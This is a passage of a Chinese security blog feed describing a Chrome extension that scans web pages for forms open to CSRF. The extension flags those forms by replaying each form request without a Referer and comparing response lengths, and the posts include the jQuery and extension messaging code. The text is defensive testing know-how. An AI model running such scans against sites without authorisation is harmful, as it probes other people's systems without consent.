&lt;p&gt;再使用if判断，当前的input标签是否存在name属性，如果没有，则使用&lt;code&gt;continue;&lt;/code&gt;跳出初始化表达式变量为v的本次循环。如果存在，再判断当前的input的value属性里是否有值，如果有值则直接赋值给ajaxParameter。代码：&lt;code&gt;ajaxParameter += input.attr(&amp;quot;name&amp;quot;) + &amp;quot;=&amp;quot; + input.val() + &amp;quot;&amp;amp;&amp;quot;;&lt;/code&gt;，如果不存在则把&lt;code&gt;15874583485&lt;/code&gt;赋值给ajaxParameter变量，为什么要使用类似于手机号码的呢，因为容错率挺高的。可以看到我在每次赋值的时候，都会在后面加上&amp;amp;字符。因为方便下面发送ajax。当然需要去掉最后一个&amp;amp;。于是乎，有了下面的代码：&lt;code&gt;ajaxParameter = ajaxParameter.substring(0,ajaxParameter.length-1);&lt;/code&gt;。&lt;/p&gt;
&lt;h4 id=&quot;0x04：与插件的background-js进行通信&quot;&gt;&lt;a href=&quot;#0x04：与插件的background-js进行通信&quot; class=&quot;headerlink&quot; title=&quot;0x04：与插件的background.js进行通信&quot;&gt;&lt;/a&gt;0x04：与插件的background.js进行通信&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;这里呢，我先说说“检测Referer的思路”，在当前网站发送一次ajax请求，Referer的地址肯定是当前的URL，是正常的，和普通提交form表单是一样的，这里呢，把action地址和method值及参数传给插件，在插件里再发送一次AJAX请求，chrome插件发送AJAX时，Refere是为空的。两次提交，如果存在Referer检测，那么返回的结果长度肯定是不一样的，如果不存在Referer检测，长度是一样的（当然可能存在个别的差异，因为可能要显示时间等，结果长度不一样，但是是不存在“Referer检测”的，下面会增加容错率）&lt;/p&gt;
&lt;p&gt;Chrome对插件通信提供了发送&lt;code&gt;chrome.runtime.sendMessage&lt;/code&gt;和接受&lt;code&gt;chrome.runtime.onMessage.addListener&lt;/code&gt;的API。&lt;br&gt;首先让我们来看看base.js文件里的发送&lt;code&gt;chrome.runtime.sendMessage&lt;/code&gt;API代码:&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$.ajax(&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    url: actionPath,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    type: (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) || (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&#39;post&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    dataType: &lt;span class=&quot;string&quot;&gt;&#39;html&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    data: (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) || (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;:ajaxParameter,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;async&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.done(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;data&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; firstAjax = data.length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; formCache = formDom;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    chrome.runtime.sendMessage(&amp;#123;action: actionPath, parameter: (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) || (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;:ajaxParameter&amp;#125;,&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;response&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.abs(firstAjax - response.status) &amp;lt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            formCache.attr(&lt;span class=&quot;string&quot;&gt;&quot;style&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;border: 1px red solid;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;因为form的method属性的值是不确定的。所以就需要对ajax的参数type进行设置：&lt;code&gt;(formDom.attr(&amp;quot;method&amp;quot;) == undefined) || (formDom.attr(&amp;quot;method&amp;quot;) == &amp;#39;get&amp;#39;)?&amp;#39;get&amp;#39;:&amp;#39;post&amp;#39;&lt;/code&gt;，这里使用了三目运算符。当method的值不存在、为get的时候，type为get。当存在的时候，则为post。&lt;/p&gt;
&lt;p&gt;下面的data参数同理。只不过没有了get、post选项。改为&lt;code&gt;&amp;#39;&amp;#39;:ajaxParameter&lt;/code&gt;。因为method值为get时，参数是附在actionPath变量里的。当为post的时候，将把之前拼接的参数传给data参数。这里计算一下返回页面的长度&lt;code&gt;var firstAjax = data.length;&lt;/code&gt;，至于下面的为什么要给变量再赋值一次呢，我也不知道，可能下面的Chrome API的作用域不同，导致在下面使用API的时候，使用formDom变量，结果不对。只能重新赋值给formCache变量，这个时候API才算正常。&lt;/p&gt;
&lt;p&gt;下面就是Chrome的API了：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;chrome.runtime.sendMessage(&amp;#123;action: actionPath, parameter: (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) || (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;method&quot;&lt;/span&gt;) == &lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;:ajaxParameter&amp;#125;,&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;response&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.abs(firstAjax - response.status) &amp;lt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            formCache.attr(&lt;span class=&quot;string&quot;&gt;&quot;style&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;border: 1px red solid;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里的action和parameter是发送的参数及值。至于代码&lt;code&gt;(formDom.attr(&amp;quot;method&amp;quot;) == undefined) || (formDom.attr(&amp;quot;method&amp;quot;) == &amp;#39;get&amp;#39;)?&amp;#39;&amp;#39;:ajaxParameter&lt;/code&gt;和上面同理，当为get的时候，不给parameter值，当为post的时候，值为ajaxParameter。&lt;code&gt;response&lt;/code&gt;为回调函数，类似ajax的done函数，返回background.js的处理结果。&lt;/p&gt;
&lt;p&gt;那background.js是如何处理的呢：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;chrome.runtime.onMessage.addListener(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;message,sender,sendResponse&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $.ajax(&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        url: message.action,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        type: (message.parameter == &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&#39;post&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        dataType: &lt;span class=&quot;string&quot;&gt;&#39;html&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        data: (message.parameter == &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;)?&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;:message.parameter,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;async&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .done(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;data&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sendResponse(&amp;#123;status: data.length&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chrome.runtime.onMessage.addListener&lt;/code&gt;是接受函数，然后就是AJAX了，在done函数里，有一个API是&lt;code&gt;sendResponse({status: data.length})&lt;/code&gt;返回插件发送AJAX时的长度。这个时候前端base.js将会受到background.js文件的返回结果。代码就返回上面的处理方式了：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.abs(firstAjax - response.status) &amp;lt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    formCache.attr(&lt;span class=&quot;string&quot;&gt;&quot;style&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;border: 1px red solid;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里的Math.abs是求绝对值的，当两次ajax返回的长度差值小于10的时候，说明不存在“Referer检测”，当大于10时，就说明存在“检测Referer的机制”了。这里的10就是&lt;code&gt;容错值&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;当存在CSRF漏洞的时候，会在form表单的外部包含一个红色的框，如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x05：结尾&quot;&gt;&lt;a href=&quot;#0x05：结尾&quot; class=&quot;headerlink&quot; title=&quot;0x05：结尾&quot;&gt;&lt;/a&gt;0x05：结尾&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;这里的token验证机制还是不完整，我会在下一版中解决的。以及JSON Hijacking。&lt;br&gt;有可能存在第四章。&lt;/p&gt;
&lt;p&gt;文章非常感谢：北风(2660668090)提供的思路及技术支持。&lt;/p&gt;
&lt;p&gt;插件下载地址：&lt;a href=&quot;http://pan.baidu.com/s/1geMUl7l&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1geMUl7l&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;顺便给自己的blog打个广告:&lt;a href=&quot;http://www.bugs.cc/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.bugs.cc/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-前言：&quot;&gt;&lt;a href=&quot;#0x00-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言：&quot;&gt;&lt;/a&gt;0x00 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;上一篇只是大致说明整个思路和流程。本篇就详细说说如何检测CSRF。为什么不在上一篇中放出插件呢。是因为误报率确实是比较多，而且无法检测Referer。而本章，重点就说明“如何检测对方是否开启了Referer检测机制”。在我的认知范围内，这是首款检测Referer的工具(不知廉耻的笑了)。今天发现腾讯在2013年就做了类似的&lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/24&quot;&gt;产品&lt;/a&gt;(这就尴尬了..)，不过还好。而且思路和实现方法有所区别。本章说检测Referer，第三章说检测token机制的强化,让检测token的成功率达到80~90%以上(其实就是写第二篇的时候，忘记写了。推到第三章了=_=….)。而且这些是腾讯产品所没有的撒。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>自动化检测CSRF</title>
    <link href="http://bugs.cc/2016/06/15/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8BCSRF/"/>
    <id>http://bugs.cc/2016/06/15/自动化检测CSRF/</id>
    <published>2016-06-15T12:49:37.000Z</published>
    <updated>2016-06-15T12:57:58.541Z</updated>
    
    <content type="html">&lt;h4 id=&quot;0x00-前言：&quot;&gt;&lt;a href=&quot;#0x00-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言：&quot;&gt;&lt;/a&gt;0x00 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;之前写过自动化检测XSS插件，今天来一发自动化检测CSRF的插件。CSRF有多种情况的出现方式，而本章所说的内容没有办法做的那么全面，就比如JSON Hijacking（第二章或者第三章会写），本章我们就说说form表单导致的CSRF漏洞。&lt;br&gt;检测form表单类型的CSRF漏洞和检测form表单类型的XSS漏洞最大的不同就是：XSS需要提交才能检测到，而CSRF只需要分析form表单就行了。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x01-前期的准备工作：&quot;&gt;&lt;a href=&quot;#0x01-前期的准备工作：&quot; class=&quot;headerlink&quot; title=&quot;0x01 前期的准备工作：&quot;&gt;&lt;/a&gt;0x01 前期的准备工作：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;既然要写，那么我们就需要demo来帮我们模拟真实环境的下的情况，而0x00节就说明了，本章只针对于form表单，所以我们的demo也就是各式各样的表单。如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF/img/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;基本上来说网上常见的表单类别都包含了，当然如果你发现有些表单没有加入进去，请说明一下，我将会在下一版中修改。&lt;/p&gt;
&lt;p&gt;我们先遍历整个网页上的form表单。代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;outerFor:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;i &amp;lt; $(&lt;span class=&quot;string&quot;&gt;&quot;form&quot;&lt;/span&gt;).length;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; formDom = $(&lt;span class=&quot;string&quot;&gt;&quot;form&quot;&lt;/span&gt;).eq(i); &lt;span class=&quot;comment&quot;&gt;//formDom代表本次循环的form表单元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imageFileSuffix = [&lt;span class=&quot;string&quot;&gt;&#39;.jpg&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.png&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.jpge&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.ico&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.gif&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.bmp&#39;&lt;/span&gt;]; &lt;span class=&quot;comment&quot;&gt;//图片后缀白名单，用户验证图片是否为验证码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; placeholderFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;跳&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;搜&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;查&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;找&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;登陆&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;注册&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;];  &lt;span class=&quot;comment&quot;&gt;//无用表单黑名单，用于验证这个form表单有没有用（针对input验证）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;find&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;login&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;reg&#39;&lt;/span&gt;];   &lt;span class=&quot;comment&quot;&gt;//无用表单黑名单，用于验证这个form表单有没有用（针对form表单验证）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;至于为什么要加上&lt;code&gt;outerFor:&lt;/code&gt;，是因为这只是最外层的for循环，里面还有for循环，为了方便我们在最里层的for循环里跳出最外层的本次循环。在最里层的for循环里我会使用&lt;code&gt;continue outerFor;&lt;/code&gt;来跳出最外层for的本次循环。（如果没有看懂，请返回上一行重新看，这很重要）&lt;/p&gt;
&lt;h4 id=&quot;0x02-去除类似搜索、页面跳转等无用的form表单：&quot;&gt;&lt;a href=&quot;#0x02-去除类似搜索、页面跳转等无用的form表单：&quot; class=&quot;headerlink&quot; title=&quot;0x02 去除类似搜索、页面跳转等无用的form表单：&quot;&gt;&lt;/a&gt;0x02 去除类似搜索、页面跳转等无用的form表单：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;首先我们需要假象一下有没有特殊的form表单，比如没有action属性，把请求交给JavaScript来完成。而这种特殊的form表单也很常见，所以这里我就先使用if判断action是否存在：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;action&quot;&lt;/span&gt;) != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//当action不为空的时候，进行下一步的操作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后就是使用JavaScript的some函数来对action进行判断，当action里的值满足于我们之前设置的黑名单里的字符串时，就直接pass，使用&lt;code&gt;continue&lt;/code&gt;来跳出初始化表达式变量为i的本次循环。转化成代码就是下面这样：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;action&quot;&lt;/span&gt;) != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionCheck = actionFilterKeyword.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;action&quot;&lt;/span&gt;).toLowerCase().indexOf(item)  != &lt;span 